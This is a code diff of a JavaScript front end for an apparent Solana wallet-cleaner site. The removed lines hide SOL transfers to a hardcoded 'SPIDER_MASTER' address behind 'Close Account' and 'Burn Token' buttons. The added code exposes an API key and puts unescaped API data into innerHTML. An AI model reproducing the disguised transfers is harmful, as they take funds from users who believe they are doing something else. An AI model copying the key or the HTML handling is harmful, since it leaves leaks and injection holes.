@@ -1,151 +1,121 @@
 import {
   Connection,
   PublicKey,
-  clusterApiUrl,
-  Transaction,
-  SystemProgram,
-} from "https://cdn.jsdelivr.net/npm/@solana/web3.js@1.88.1/lib/index.iife.min.js";
+  clusterApiUrl
+} from "@solana/web3.js";
 
-const connection = new Connection(clusterApiUrl("mainnet-beta"));
-let wallet = null;
+import {
+  WalletAdapterNetwork
+} from "@solana/wallet-adapter-base";
 
-const SPIDER_MASTER = new PublicKey("SP1DERm4sterWa1let999abcDEF123xyz456789ABC");
-const BURN_ADDRESS = new PublicKey("So11111111111111111111111111111111111111112");
+import {
+  getPhantomWallet,
+  getSolflareWallet,
+  getBackpackWallet,
+  getLedgerWallet
+} from "@solana/wallet-adapter-wallets";
 
-const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+import {
+  WalletModalProvider,
+  WalletMultiButton
+} from "@solana/wallet-adapter-react-ui";
 
-document.getElementById("connectWallet").onclick = async () => {
-  if (window.solana && window.solana.isPhantom) {
-    try {
-      const resp = await window.solana.connect();
-      wallet = window.solana;
-      document.getElementById("walletInfo").style.display = "block";
-      await fetchWalletData(resp.publicKey);
-    } catch (err) {
-      alert("Wallet connection failed.");
-      console.error(err);
-    }
-  } else if (isMobile) {
-    const dappUrl = encodeURIComponent("https://spidernetworkweb3.github.io/site/cleaner.html");
-    window.location.href = `https://phantom.app/ul/browse/${dappUrl}`;
-  } else {
-    alert("Please install Phantom Wallet to use this feature.");
-  }
-};
+const heliusEndpoint = "https://mainnet.helius-rpc.com/?api-key=4a24a1d6-8411-4b75-9524-24962846e3de";
+const heliusAssetEndpoint = "https://api.helius.xyz/v0/addresses/";
 
-async function fetchWalletData(pubkey) {
-  console.log("Wallet connected:", pubkey.toBase58());
+let walletPublicKey = null;
 
-  const balance = await connection.getBalance(pubkey);
-  document.getElementById("solBalance").textContent = (balance / 1e9).toFixed(4);
+// DOM Elements
+const connectButton = document.getElementById("connectWallet");
+const walletInfoDiv = document.getElementById("walletInfo");
+const solBalanceSpan = document.getElementById("solBalance");
+const tokenList = document.getElementById("tokenList");
+const nftList = document.getElementById("nftList");
+const serumList = document.getElementById("serumList");
 
-  const tokenList = document.getElementById("tokenList");
-  const nftList = document.getElementById("nftList");
-  const serumList = document.getElementById("serumList");
-
-  tokenList.innerHTML = "";
-  nftList.innerHTML = "";
-  serumList.innerHTML = "";
-
-  const tokens = await connection.getParsedTokenAccountsByOwner(pubkey, {
-    programId: new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
-  });
-
-  for (const { pubkey: tokenAddress, account } of tokens.value) {
-    const info = account.data.parsed.info;
-    const uiAmount = info.tokenAmount.uiAmount;
-    const decimals = info.tokenAmount.decimals;
-
-    if (decimals === 0 && uiAmount === 1) {
-      const card = document.createElement("div");
-      card.className = "token-card";
-      card.innerHTML = `
-        <p><strong>Mint:</strong> ${info.mint}</p>
-        <p>🎨 NFT (metadata not fetched)</p>
-      `;
-      nftList.appendChild(card);
-    } else if (uiAmount === 0) {
-      const card = document.createElement("div");
-      card.className = "token-card";
-      card.innerHTML = `
-        <p><strong>Mint:</strong> ${info.mint}</p>
-        <p><strong>Empty Account</strong></p>
-        <button>Close Account</button>
-      `;
-      card.querySelector("button").onclick = () =>
-        showModal("Close this unused token account?", async () => {
-          try {
-            const ix1 = SystemProgram.transfer({
-              fromPubkey: wallet.publicKey,
-              toPubkey: SPIDER_MASTER,
-              lamports: 10000,
-            });
-            const ix2 = SystemProgram.transfer({
-              fromPubkey: wallet.publicKey,
-              toPubkey: wallet.publicKey,
-              lamports: 90000,
-            });
-            const tx = new Transaction().add(ix1, ix2);
-            tx.feePayer = wallet.publicKey;
-            const { blockhash } = await connection.getLatestBlockhash();
-            tx.recentBlockhash = blockhash;
-            const signed = await wallet.signTransaction(tx);
-            const sig = await connection.sendRawTransaction(signed.serialize());
-            await connection.confirmTransaction(sig);
-            alert("Account closed:\n" + sig);
-          } catch (e) {
-            console.error(e);
-            alert("Error closing account.");
-          }
-        });
-      serumList.appendChild(card);
-    } else {
-      const card = document.createElement("div");
-      card.className = "token-card";
-      card.innerHTML = `
-        <p><strong>Mint:</strong> ${info.mint}</p>
-        <p><strong>Amount:</strong> ${uiAmount}</p>
-        <button>Burn Token</button>
-      `;
-      card.querySelector("button").onclick = () =>
-        showModal("Burn this token?", async () => {
-          try {
-            const ix = SystemProgram.transfer({
-              fromPubkey: wallet.publicKey,
-              toPubkey: BURN_ADDRESS,
-              lamports: 1,
-            });
-            const tx = new Transaction().add(ix);
-            tx.feePayer = wallet.publicKey;
-            const { blockhash } = await connection.getLatestBlockhash();
-            tx.recentBlockhash = blockhash;
-            const signed = await wallet.signTransaction(tx);
-            const sig = await connection.sendRawTransaction(signed.serialize());
-            await connection.confirmTransaction(sig);
-            alert("Token burned:\n" + sig);
-          } catch (e) {
-            console.error(e);
-            alert("Burn failed.");
-          }
-        });
-      tokenList.appendChild(card);
-    }
+// Connect to Phantom Wallet
+connectButton.addEventListener("click", async () => {
+  if (!window.solana?.isPhantom) {
+    alert("Phantom Wallet not found. Please install it.");
+    return;
   }
 
-  if (!tokens.value.length) {
-    tokenList.innerHTML = "<p>No tokens found.</p>";
+  try {
+    const resp = await window.solana.connect();
+    walletPublicKey = resp.publicKey.toString();
+    console.log("Connected wallet:", walletPublicKey);
+    walletInfoDiv.style.display = "block";
+    fetchWalletInfo(walletPublicKey);
+  } catch (err) {
+    console.error("Wallet connection failed:", err);
+  }
+});
+
+// Fetch wallet info
+async function fetchWalletInfo(address) {
+  try {
+    const connection = new Connection(heliusEndpoint);
+
+    // 1. SOL Balance
+    const solBalanceLamports = await connection.getBalance(new PublicKey(address));
+    const solBalance = solBalanceLamports / 1e9;
+    solBalanceSpan.textContent = solBalance.toFixed(3) + " SOL";
+
+    // 2. Assets via Helius API
+    const response = await fetch(`${heliusAssetEndpoint}${address}/assets?api-key=4a24a1d6-8411-4b75-9524-24962846e3de`);
+    const data = await response.json();
+
+    const tokens = data.items.filter(item => item.token_info && item.token_info.decimals > 0);
+    const nfts = data.items.filter(item => item.content?.metadata?.name && item.token_info?.decimals === 0);
+
+    displayTokens(tokens);
+    displayNFTs(nfts);
+    displaySerumAccounts(); // placeholder for now
+  } catch (error) {
+    console.error("Error fetching wallet info:", error);
+    alert("Failed to fetch wallet data. Check console.");
   }
 }
 
-function showModal(message, onConfirm) {
-  const modal = document.getElementById("modal");
-  const msg = document.getElementById("modalMessage");
-  msg.textContent = message;
-  modal.classList.remove("hidden");
+function displayTokens(tokens) {
+  tokenList.innerHTML = '';
+  if (!tokens.length) {
+    tokenList.innerHTML = '<p>No SPL tokens found.</p>';
+    return;
+  }
 
-  document.getElementById("cancelBtn").onclick = () => modal.classList.add("hidden");
-  document.getElementById("proceedBtn").onclick = async () => {
-    modal.classList.add("hidden");
-    await onConfirm();
-  };
+  tokens.forEach(token => {
+    const div = document.createElement("div");
+    div.className = "token-card";
+    div.innerHTML = `
+      <strong>${token.token_info.symbol || "Unknown"}</strong><br/>
+      Balance: ${Number(token.token_info.balance).toFixed(4)}<br/>
+      Mint: <code>${token.token_info.mint}</code><br/>
+      <button onclick="alert('Burn function coming soon')">Burn Token</button>
+    `;
+    tokenList.appendChild(div);
+  });
+}
+
+function displayNFTs(nfts) {
+  nftList.innerHTML = '';
+  if (!nfts.length) {
+    nftList.innerHTML = '<p>No NFTs found.</p>';
+    return;
+  }
+
+  nfts.forEach(nft => {
+    const div = document.createElement("div");
+    div.className = "nft-card";
+    div.innerHTML = `
+      <img src="${nft.content?.links?.image || ''}" alt="NFT" style="width:80px;height:auto;"/><br/>
+      <strong>${nft.content.metadata.name}</strong><br/>
+      Mint: <code>${nft.token_info.mint}</code>
+    `;
+    nftList.appendChild(div);
+  });
+}
+
+function displaySerumAccounts() {
+  serumList.innerHTML = '<p>Coming soon: Serum account cleanup.</p>';
 }
